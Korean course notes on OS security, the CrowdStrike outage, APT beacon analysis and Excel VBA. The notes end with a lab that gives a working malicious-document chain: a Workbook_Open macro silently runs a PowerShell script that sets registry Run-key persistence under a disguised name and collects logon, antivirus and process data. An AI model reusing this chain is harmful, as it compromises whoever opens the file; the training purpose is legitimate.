# 오전
- OS 및 DB 수동진단 기초

- [사례] 마이크로소프트 전산 마비 사태
    - 크라우드스트라이크의 보안 소프트웨어 업데이트가 충돌하며 전 세계적인 IT 시스템 마비 사태가 발생.
    - 허용되지 않은 함수 호출로 인해 운영체제가 하드웨어 보호를 위해 블루스크린을 띄운 일

- 운영체제는 '커널'이 핵심이며, 메모리, CPU , I/O 장치와 같은 하드웨어 구성요소를 관리. 운영체제는 '커널'의 메니저

- '커널'은 다음과 같은 주요 기능을 담당
    1. 메모리 관리 - 실행 중인 프로세스에 대한 메모리 할당/할당 해제. 프로세스에서 사용하는 메모리 추적
    2. 프로세스 관리 - 프로세스 수명 주기를 관리하고 두 개 이상의 프로세스가 문제 없이 메모리에서 실행되도록 보장
    3. 장치 관리 - 모니터, 마우스, 키보드, 프린터 등의 장치와의 통신
    4. 파일 시스템 관리 - 하드 드라이브나 외부 저장장치에 있는 파일을 정리

- 모든 컴퓨터/기계에서 실행되는 프로세스는 두 가지 모드로 실행
    - 커널 모드 or 사용자 모드

- [커널 모드]
    - 이 모드는 가장 높은 권한을 가지고 있으며 모든 하드웨어와 직접 상호 작용할 수 있음
    - 중요한 모드이며 코드의 오류는 시스템 불안정성과 결국 충돌을 초래할 수 있으므로 꼼꼼하게 작성되어야 하며 오류가 없어여 함

- [사용자 모드]
    - 사용자 모드는 권한이 가장 적고 하드웨어와 직접 상호 작용할 수 없음(운영체제를 사용하여 모든 하드웨어 장치에서 데이터를 가져옴)
    - 사용자 모드 프로세스는 하드웨어로 데이터를 송수신하기 위해 시스템을 호출
    - 한편, 운영 체제는 사용자 프로세스가 자신에게 할당되지 않은 메모리에 액세스하지 않도록 통제함
    - 통제의 수단으로 사용자 프로세스가 다른 프로세스나 커널 프로세스에 속하는 메모리에 액세스하는 경우, 운영 체제는 프로세스에 **SIGSEV(segmentation fault라는 의미 / 원인 프로그램이 할당되지 않은 메모리에 접근한 경우 발생하는 오류)**를 송신하며, 프로세스가 종료되면 사용자는 SEGFAULT를 확인!
    - 웹 브라우저, MS Excel, MS Word, 게임, VLC와 같은 미디어 플레이어 등 매일 사용하는 애플리케이션은 통상 사용자 모드에서 실행

- [BSOD]
    - BSOD(블루 스크린을 의미하며, Blue Screen Of Death, 마이크로소프트 윈도우 운영체제에서 시스템 오류를 복구하지 못할 때 나타나는 화면)는 Windows 기기에만 표시됨 시스템이 오작동했음을 나타내며, 하드웨어 또는 소프트웨어 문제를 표시함 - 죽음의 표시를 남겨 이를 가지고 분석할 수 있음
    - BSOD가 발생하는 몇 가지 이유
        1) 파일 시스템 손상 - 커널에 필요한 파일이 손상된 경우 시스템이 충돌할 수 있음
        2) 장치 드라이버 문제 - 호환되지 않거나 손상된 장치 드라이버는 통신 오류를 초래할
        수 있음
        3) 소프트웨어 버그 - 중요한 커널 데이터 구조를 수정하거나 금지된 메모리 위치에
        액세스하는 버그로 인해 시스템이 중단될 수 있음
        4) 맬웨어 - 맬웨어는 시스템 프로세스를 방해하여 BSOD를 유발

- [CrowdStrike Falcon] (EDR : 엔드포인트 탐지 및 보호)
    - Falcon은 모든 기기에 설치되고 에이전트(센서)로 실행(기기 활동을 지속적으로 모니터링)
    - Falcon Agent는 다음과 같은 활동을 모니터링해야 하므로 커널 프로세스로 실행
        1) 장치 드라이버 활동
        2) 네트워크 트래픽
        3) 제한된 파일 액세스
    - 위 활동에는 가장 높은 권한이 필요하며, 결과적으로 Falcon Agent는 [커널모드]에서 실행(윈도우 업데이트와 달리 Falcon Agent는 백그라운드에서 조용히(Silent Mode) 스스로 업데이트하며, 클라우드 플랫폼에서 최신 업데이트를 받음)        
    - 키로거처럼 동작, silent mode로 인해 사용자가 알지 못하는 상태로 동작
- [CrowdStrike Falcon] 내장방식
    - CrowdStrike Falcon 에이전트 소프트웨어는 사용자 모드에서 실행되는 반면, 다른 구성 요소는 커널 모드에서 작동하여 특권 액세스와 시스템과의 긴밀한 통합  
    - 이를 통해 호스트에 대한 전체 액세스 권한이 있는 권한 모드에서 실행
        - 소프트웨어는 파일 및 네트워크와 같은 하드웨어 관련 드라이버 및 하위 시스템에 가장 가깝게 처리하여 Windows 호스트 전체에서 핵심 보안 관련 처리를 검사(커널 모드에서는 이러한 작업을 매우 Low한 영역에서 실행)
    - Crowdstrike Falcon은 매우 초기 단계에서 부팅 시퀀스에 바인딩되어 악성 루트킷 및 기타 보안 위협을 우회하는 것을 방지
        - 커널 모드에서 실행한다는 것은 커널 모드에서 실행하기 위한 높은 수준의 권한(로컬 관리자)이 있다는 것을 의미

- CrowdStrike Falcon(대응방안)
    1) 안정적/점진적 업데이트 배포 전략 수립(Ex. 롤링, 블루/그린 업데이트 등)
    2) 벤더 의존성 분산 전략 (Ex. Windows / Mac / Linux 등)
        - 코인 거래소 시스템들은 Mac을 많이 사용
        - 블록체인은 리눅스를 회사 업무용 PC로 많이 사용
    3) 소프트웨어 롤백 전략 재정의(수동적 번거로움 최소화)
        - Silent Mode로 보이지 않아 롤백이 힘들었음
        - 한 번 뜨면 못지움(포맷, 삭제 툴 필요. 커널 모드에서 동작해서 민감하고, 암호키를 받아야만 삭제 가능.)
    4) 보안업체와의 계약 시, 커널 접근 영향도 검토 및 SLA 강화
        - SLA 란? 서비스 제공자와 고객 간의 서비스 품질에 대한 협약으로, 제공한 서비스의 수준을 정하고 책임을 명확하게 나누며 추후 피해보상의 단초를 제공함
- 벤더 입장에서
    5) 커널 모드 배포 테스트 전략 수립 (Ex. Windows Kernel 사전 테스트)
    6) DR 전략 및 레질리언스(회복탄력성) 체계 환류
    7) RUST 기반의 Windows 시스템 빌드(C#, C++ 언어의 프로세스 충돌 문제)
        - Rust 란? 러스트 재단에서 개발되고 있는 메모리 안전성과 성능, 편의성에 중점을 둔 프로그래밍 언어. 가비지 컬렉터 없이 메모리 안전성을 제공 --> 바꾸게 되면 국방부의 모든 시스템을 변경해야 해서 진행이 더뎠음.

## APT Down: 공격자 식별 중심의 분석
- Q. TTPs 가 무엇인지, 전략/전술에 대한 이해도가 왜 필요한지?
    - TTP: 공격자의 전략과 전술, 그리고 그 과정
    - 공격자는 TTP를 쉽게 확보하거나 버릴 수 없다. 방어 환경의 특성과 맞물려 있어 방어자는 방어 환경에 대해 정ㅈ확히 이해하고 있어야 한다. 
    - 공격의 흐름과 과정을 전략/전술 관점으로 보아야 한다. 
    - TTP를 이해한 방어자는 2가지를 설명할 수 있어야 한다. 
        1. 공격자의 TTP가 방어자 환경에 유효한 것인지 여부
        2. 유효하다면 TTP를 무력화할 수 있는 방어 전략은 무엇인지
    - 위와 같이 TTP는 공격자의 전략과 전술이기 때문에 이에 대한 이해도가 있어야 방어자의 입장에서 무력화할 수 있는 방안을 마련할 수 있다.

- Q. 해커가 어떤 공격을 수행했고, 조작했고, 유출했고, 은닉했는데, 이것을 왜 했을까?
    1. magic packet을 사용하여 master 실행. 이를 통해 공격자가 원하는 시점에만 backdoor를 실행시킬 수 있음
    2. tomcat rootkit, 프로세스를 숨기는 기능과 네트워크 연결 상태를 은닉하는 기능으로, 감염 상태를 숨겨 지속적인 접근 권한 유지와 웹 서버의 신뢰도를 악용하기 위함. 또한 명령어 전송 시간 간격, 전송 시간 간격을 조정하고, 다운로드를 통해 유출하였다. 공격자의 목적으로는 금전적 이득, 기업 스파이, 시스템 자원 탈취 또는 서비스 중단이 있다.

- Q. 읽다 보면, ‘비콘’ 시스템이 무엇인지, 해킹과 연관성이 있는지?
    - 피싱 메일 열람 확인용 비콘, 피싱 메일이 수신자에 의해 열람되었는지 확인하기 위한 목적. 공격의 성공 여부를 알려주는 추적 장치의 역할을 한다.
    - Private cobaltstrike beacon, 공격자가 victim 환경에서 원격으로 특정 명령어를 실행시킬 때 활용하였다. 악성코드에 해당하며, 피해자의 컴퓨터에 설치되어 다음과 같은 동작을 한다.
        1. 주기적으로(60초) 해커의 C2(명령제어) 서버와 통신
        2. 감염된 PC의 시스템 정보(컴퓨터 이름, 사용자명, IP 주소, OS 정보 등)를 C2 서버로 전송
        3. C2 서버로부터 원격 명령을 받아 파일 업로드/다운로드, 추가 악성코드 실행 등 공격자의 작업을 수행

- Q. 공격 그룹을 추적하는데 있어, 어떠한 구조적 특징이 있는지?(GPT 답변)
    - 해커가 사용하는 비콘의 구조적 특징은 특정 공격 그룹의 TTP(전술, 기술, 절차)를 식별하고 추적하는 데 결정적인 단서가 됩니다. 보고서에서 분석된 비콘은 다음과 같은 특징을 가집니다.

    - 코드의 기원: 분석된 비콘 코드는 홍콩의 한 사용자가 만든 'sharkone project'라는 이름의 공개 프로젝트에서 파생되었습니다. 코드의 원본을 파악하는 것은 공격자의 개발 배경을 추정하는 데 도움이 됩니다.

    - 정교한 C2 통신 방식 (Failover Routine): 이 비콘은 C2 서버와의 연결을 안정적으로 유지하기 위해 정교한 페일오버(failover) 루틴을 가지고 있습니다. 단순히 하나의 서버에만 접속하는 것이 아니라, 여러 개의 [호스트, URL] 쌍으로 구성된 목록을 가지고 무작위(random) 또는 순환(rotate) 방식으로 접속을 시도합니다. 이러한 통신 방식은 APT41과 같은 특정 공격 그룹이 사용하는 TTP와 유사성을 보입니다.

    - 제한된 기능: 상용 코발트 스트라이크 비콘과 달리, 분석된 비콘은 cd, upload, download, ls, pwd 등 특정 목적에 필요한 일부 작업(task)만을 수행하도록 만들어졌습니다. 이렇게 맞춤화된 기능의 집합은 해당 공격 그룹의 고유한 특징이 될 수 있습니다.

    - 설정 값: 비콘의 설정 파일에는 C2 서버의 IP 주소(192.168.179.112), 포트(8088), 통신 경로(/submit.php), 위장용 User-Agent 문자열 등 공격 인프라를 식별할 수 있는 정보가 암호화되어 포함되어 있습니다. 이러한 값들은 공격 그룹을 특정하는 '지문'과도 같습니다.

```python
''' 
엑셀 매크로 실습
1. 여러 파일 하나로 합치기
2. 하나의 파일 여러 개로 분할하기
'''
# 1번 여러 파일 하나로 합치기
Sub Combine_Files_Into_One()

    ' 1. 변수 선언 (영문으로 수정)
    Dim folderPath As String
    Dim fileName As String
    Dim wbCombined As Workbook
    Dim wbSource As Workbook
    
    ' 2. 사용자에게 폴더 선택 요청
    With Application.FileDialog(msoFileDialogFolderPicker)
        .Title = "통합할 엑셀 파일이 있는 폴더를 선택하세요."
        If .Show <> -1 Then Exit Sub ' 취소 시 매크로 종료
        folderPath = .SelectedItems(1) & "\"
    End With
    
    ' 3. 속도 향상을 위한 설정
    Application.ScreenUpdating = False
    Application.DisplayAlerts = False ' 경고창 비활성화

    ' 4. 새로운 통합 문서 생성
    Set wbCombined = Workbooks.Add
    
    ' 5. 폴더 내 모든 .xlsx 파일 처리
    fileName = Dir(folderPath & "*.xlsx")
    
    Do While fileName <> ""
        ' 현재 매크로가 실행 중인 파일은 제외
        If fileName <> ThisWorkbook.Name Then
            
            ' 소스 파일 열기
            Set wbSource = Workbooks.Open(folderPath & fileName)
            
            ' 소스 파일의 첫 번째 시트를 통합 문서로 복사
            wbSource.Worksheets(1).Copy After:=wbCombined.Worksheets(wbCombined.Worksheets.Count)
            
            ' 시트 이름을 파일 이름으로 변경 (확장자 제외)
            wbCombined.Worksheets(wbCombined.Worksheets.Count).Name = Left(fileName, Len(fileName) - 5)
            
            ' 소스 파일 닫기
            wbSource.Close SaveChanges:=False
            
        End If
        ' 다음 파일 찾기
        fileName = Dir
    Loop
    
    ' 6. 기본으로 생성된 첫 시트 삭제
    If wbCombined.Worksheets.Count > 1 Then
        wbCombined.Worksheets(1).Delete
    End If
    
    ' 7. 통합 파일을 저장
    wbCombined.SaveAs folderPath & "통합_예상매출.xlsx"
    
    ' 8. 설정 복원 및 완료 메시지
    Application.DisplayAlerts = True
    Application.ScreenUpdating = True
    
    MsgBox "선택한 폴더의 모든 엑셀 파일이 '통합_예상매출.xlsx' 파일로 통합되었습니다.", vbInformation, "작업 완료"

End Sub
```

```python
# 2. 하나의 파일 여러 개로 분할하기
Sub Split_Sheets_Into_Files()

    ' 1. 변수 선언
    Dim folderPath As String
    Dim newFolderPath As String
    Dim ws As Worksheet
    
    ' 2. 매크로 실행 속도 향상을 위한 설정
    Application.ScreenUpdating = False
    Application.DisplayAlerts = False ' 경고창 비활성화

    ' 3. 현재 통합 문서의 경로를 기준으로 새 폴더 경로 설정
    folderPath = ThisWorkbook.Path
    newFolderPath = folderPath & "\분리된_파일들\"
    
    ' 4. '분리된_파일들' 폴더가 없으면 새로 생성
    If Dir(newFolderPath, vbDirectory) = "" Then
        MkDir newFolderPath
    End If
    
    ' 5. 현재 통합 문서의 모든 시트를 순회
    For Each ws In ThisWorkbook.Worksheets
        ' 시트를 복사하여 새로운 통합 문서 생성
        ws.Copy
        
        ' 새로 생성된 통합 문서를 시트 이름으로 저장
        With ActiveWorkbook
            .SaveAs fileName:=newFolderPath & ws.Name & ".xlsx", FileFormat:=xlOpenXMLWorkbook
            .Close SaveChanges:=False
        End With
    Next ws
    
    ' 6. 설정 복원 및 완료 메시지
    Application.DisplayAlerts = True
    Application.ScreenUpdating = True
    
    MsgBox "모든 시트가 '분리된_파일들' 폴더에 개별 파일로 저장되었습니다.", vbInformation, "작업 완료"

End Sub
```

```python
# VBA 코드
' 엑셀 VBA 매크로 코드 - 순차 실행 보장
Sub PowerShell연동테스트()
    Dim shell As Object
    Dim psCommand As String
    Dim exitCode As Long
    
    ' Shell 객체 생성
    Set shell = CreateObject("WScript.Shell")
    
    On Error GoTo ErrorHandler
    
    ' 1단계: 첫 번째 PowerShell 명령 실행
    MsgBox "1단계: PowerShell 연동 테스트를 시작합니다.", vbInformation, "단계 1"
    
    psCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -Command ""Write-Host '1단계 실행 중...' -ForegroundColor Green; Start-Sleep 2; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('1단계: PowerShell 연동 테스트 성공!`n현재 시간: ' + (Get-Date).ToString(), 'Excel-PowerShell 연동 - 1단계', 'OK', 'Information')"""
    
    exitCode = shell.Run(psCommand, 1, True)  ' True = 완료까지 대기
    
    If exitCode = 0 Then
        MsgBox "1단계 완료되었습니다.", vbInformation, "1단계 완료"
    End If
    
    ' 2단계: 두 번째 PowerShell 명령 실행
    MsgBox "2단계: 시스템 정보를 가져옵니다.", vbInformation, "단계 2"
    
    psCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -Command ""Write-Host '2단계 실행 중...' -ForegroundColor Blue; $info = '컴퓨터: ' + $env:COMPUTERNAME + '`n사용자: ' + $env:USERNAME; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('2단계: 시스템 정보`n' + $info, 'Excel-PowerShell 연동 - 2단계', 'OK', 'Information')"""
    
    exitCode = shell.Run(psCommand, 1, True)  ' True = 완료까지 대기
    
    If exitCode = 0 Then
        MsgBox "2단계 완료되었습니다.", vbInformation, "2단계 완료"
    End If
    
    ' 3단계: 최종 완료 메시지
    MsgBox "모든 PowerShell 스크립트가 순서대로 성공적으로 실행되었습니다!", vbInformation, "전체 완료"
    
    Exit Sub
    
ErrorHandler:
    MsgBox "PowerShell 실행 중 오류가 발생했습니다: " & Err.Description, vbCritical, "오류"
End Sub

' 간단한 버전 (PowerShell 파일 순차 실행)
Sub PowerShell파일순차실행()
    Dim shell As Object
    Dim psFilePath As String
    Dim exitCode As Long
    
    ' PowerShell 파일 경로 (데스크톱에 있다고 가정)
    psFilePath = Environ("USERPROFILE") & "\Desktop\test_script.ps1"
    
    Set shell = CreateObject("WScript.Shell")
    
    On Error GoTo ErrorHandler
    
    MsgBox "PowerShell 파일 실행을 시작합니다: " & vbCrLf & psFilePath, vbInformation, "실행 시작"
    
    ' PowerShell 파일 실행 (완료까지 대기)
    exitCode = shell.Run("powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -File """ & psFilePath & """", 1, True)
    
    If exitCode = 0 Then
        MsgBox "PowerShell 파일이 성공적으로 완료되었습니다!", vbInformation, "실행 완료"
    Else
        MsgBox "PowerShell 파일 실행이 완료되었지만 종료 코드: " & exitCode, vbExclamation, "실행 완료"
    End If
    
    Exit Sub
    
ErrorHandler:
    MsgBox "PowerShell 파일 실행 중 오류: " & Err.Description, vbCritical, "오류"
End Sub

' 여러 PowerShell 명령을 순차적으로 실행하는 함수
Sub 여러PowerShell순차실행()
    Dim shell As Object
    Dim commands() As String
    Dim i As Integer
    Dim exitCode As Long
    
    Set shell = CreateObject("WScript.Shell")
    
    ' 실행할 PowerShell 명령들을 배열에 저장
    ReDim commands(2)
    commands(0) = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -Command ""Write-Host '명령 1 실행 중...' -ForegroundColor Red; Start-Sleep 2; Write-Host '명령 1 완료!' -ForegroundColor Green"""
    commands(1) = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -Command ""Write-Host '명령 2 실행 중...' -ForegroundColor Yellow; Start-Sleep 2; Write-Host '명령 2 완료!' -ForegroundColor Green"""
    commands(2) = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -Command ""Write-Host '명령 3 실행 중...' -ForegroundColor Cyan; Start-Sleep 2; Write-Host '모든 명령 완료!' -ForegroundColor Magenta"""
    
    ' 각 명령을 순차적으로 실행
    For i = 0 To UBound(commands)
        MsgBox "명령 " & (i + 1) & "을(를) 실행합니다.", vbInformation, "진행 상황"
        
        exitCode = shell.Run(commands(i), 1, True)  ' True = 완료까지 대기
        
        If exitCode = 0 Then
            MsgBox "명령 " & (i + 1) & " 완료!", vbInformation, "단계 완료"
        End If
    Next i
    
    MsgBox "모든 PowerShell 명령이 순서대로 완료되었습니다!", vbInformation, "전체 완료"
End Sub
```

```python
'''
파워쉘 코드에 악성행위 주입하기 실습
new_test.ps1에 실습용 악성행위 주입.
엑셀 파일이 실행될 때 악성행위가 실행되도록 함.
악성행위는 다음과 같음.
1. 시스템 활성 로그온 정보를 text로 지정 경로(C:\Users\<사용자 이름>\AppData\Local\Temp)에 저장
2. 동작하고 있는 AV(안티 바이러스)가 있는지 확인하고, 있다면 종류와 버전을 text 로 지정 경로(C:\Users\<사용자 이름>\AppData\Local\Temp)에 저장
    * 위 내용은 하나의 text 파일로 통합
3. 프로세스 목록을 확인하고 text파일로 별도로 저장해서 지정 경로 (C:\Windows\System32\drivers\etc)에 저장
'''

<#
.SYNOPSIS
    악성코드 모의 훈련용 파워쉘 스크립트
.DESCRIPTION
    이 스크립트는 시스템에서 정보 수집 및 지속성 유지 기술을 시뮬레이션하기 위해 제작되었습니다.
    1. 자동 실행(Persistence)을 위해 레지스트리에 자신을 등록합니다.
    2. 현재 로그온된 사용자 정보와 설치된 안티 바이러스 제품 정보를 수집하여 임시 폴더에 저장합니다.
    3. 현재 실행 중인 모든 프로세스 목록을 수집하여 시스템 폴더에 저장합니다.
.WARNING
    본 스크립트는 교육 및 모의 훈련 목적으로만 사용해야 합니다.
    실제 시스템에 악의적인 목적으로 사용하는 것을 엄격히 금합니다.
#>

# =================================================================================
# 스크립트 주요 설정
# =================================================================================

# 정보 수집 결과를 저장할 파일 경로 설정 (로그온 정보, AV 정보)
$userInfoPath = Join-Path $env:TEMP "sys_log.txt"

# 프로세스 목록을 저장할 파일 경로 설정 (권한 상승 필요)
# (공격자들이 흔적을 숨기기 위해 예상치 못한 경로를 사용하는 것을 시뮬레이션)
$processListPath = "C:\Windows\System32\drivers\etc\proc.db"

# =================================================================================
# 1. 지속성 유지 (Persistence) - 레지스트리 Run 키 등록
# =================================================================================
try {
    # 현재 실행 중인 스크립트의 전체 경로를 가져옴
    $scriptPath = $MyInvocation.MyCommand.Path

    # 레지스트리 경로와 이름 설정 (일반적인 프로그램 이름으로 위장)
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "UpdateChecker" # 사용자가 의심하지 않을 만한 이름

    # 사용자가 로그온할 때마다 이 스크립트가 자동으로 실행되도록 레지스트리 값 설정
    # -WindowStyle Hidden: 파워쉘 창이 보이지 않게 숨겨서 실행
    Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -ErrorAction Stop

    # 로그 파일에 지속성 설정 성공 기록 (시뮬레이션용)
    "[+] Persistence: Registry Run key '$regName' was successfully created." | Out-File -FilePath $userInfoPath -Append -Encoding UTF8
}
catch {
    # 오류 발생 시 로그 파일에 기록
    "[-] Persistence Error: Failed to create registry key. Error: $($_.Exception.Message)" | Out-File -FilePath $userInfoPath -Append -Encoding UTF8
}


# =================================================================================
# 2. 시스템 활성 로그온 정보 수집
# =================================================================================
try {
    # 제목 추가
    "==========[ Active Logon Sessions ]==========" | Out-File -FilePath $userInfoPath -Append -Encoding UTF8

    # 'query user' 명령어를 실행하여 현재 시스템에 로그온한 사용자 세션 정보를 가져옴
    query user | Out-File -FilePath $userInfoPath -Append -Encoding UTF8
}
catch {
    "[-] Logon Info Error: Failed to get logon information. Error: $($_.Exception.Message)" | Out-File -FilePath $userInfoPath -Append -Encoding UTF8
}


# =================================================================================
# 3. 안티 바이러스(AV) 정보 수집
# =================================================================================
try {
    # 제목 추가
    "`n==========[ Antivirus Information ]==========" | Out-File -FilePath $userInfoPath -Append -Encoding UTF8

    # WMI(Windows Management Instrumentation)를 통해 설치된 안티바이러스 제품을 쿼리
    $avProducts = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName "AntiVirusProduct"

    if ($avProducts) {
        foreach ($av in $avProducts) {
            # 제품 이름(버전 포함)을 가져와 파일에 추가
            "Found AV: $($av.displayName)" | Out-File -FilePath $userInfoPath -Append -Encoding UTF8
        }
    }
    else {
        "No Antivirus product found." | Out-File -FilePath $userInfoPath -Append -Encoding UTF8
    }
}
catch {
    "[-] AV Info Error: Failed to query Antivirus products. Error: $($_.Exception.Message)" | Out-File -FilePath $userInfoPath -Append -Encoding UTF8
}


# =================================================================================
# 4. 프로세스 목록 수집
# =================================================================================
try {
    # Get-Process를 사용하여 현재 실행 중인 모든 프로세스 목록을 가져옴
    # 관리자 권한이 없으면 C:\Windows\System32\drivers\etc 경로에 쓸 수 없으므로 오류가 발생함
    Get-Process | Format-Table -AutoSize | Out-File -FilePath $processListPath -Encoding UTF8 -ErrorAction Stop
    "[+] Process List: Successfully saved to $processListPath" | Out-File -FilePath $userInfoPath -Append -Encoding UTF8
}
catch {
    # 권한 부족 또는 기타 오류 발생 시 로그에 기록
    "[-] Process List Error: Failed to save process list. Ensure you are running with Administrator privileges. Error: $($_.Exception.Message)" | Out-File -FilePath $userInfoPath -Append -Encoding UTF8
}
```

```python
### 엑셀 매크로 VBA 코드
Private Sub Workbook_Open()
    ' 변수 선언
    Dim objShell As Object
    Dim psScriptPath As String
    Dim command As String
    
    ' =================================================================
    ' === 사용자가 수정한 최종 경로 ===
    ' 바탕화면에 있는 new_test.ps1 파일의 전체 경로입니다.
    psScriptPath = "C:\Users\ez\Desktop\new_test.ps1"
    ' =================================================================
    
    ' WScript.Shell 객체 생성
    Set objShell = CreateObject("WScript.Shell")
    
    ' 실행할 파워쉘 명령어 생성
    ' -ExecutionPolicy Bypass: 실행 정책을 우회하여 스크립트를 실행합니다.
    ' -File: 지정된 스크립트 파일을 실행합니다.
    ' psScriptPath 변수 양쪽에 큰따옴표를 추가하여 경로에 공백이 있어도 인식되도록 합니다.
    command = "powershell.exe -ExecutionPolicy Bypass -File """ & psScriptPath & """"
    
    ' 파워쉘 스크립트를 숨겨진 창(0)으로 실행하고, 스크립트가 끝날 때까지 대기(True)
    objShell.Run command, 0, True
    
    ' 객체 해제
    Set objShell = Nothing
    
    ' 스크립트 실행 후 사용자에게 알림 메시지 표시
    MsgBox "파워쉘 코드가 실행되었습니다.", vbInformation, "실행 완료"
End Sub
```
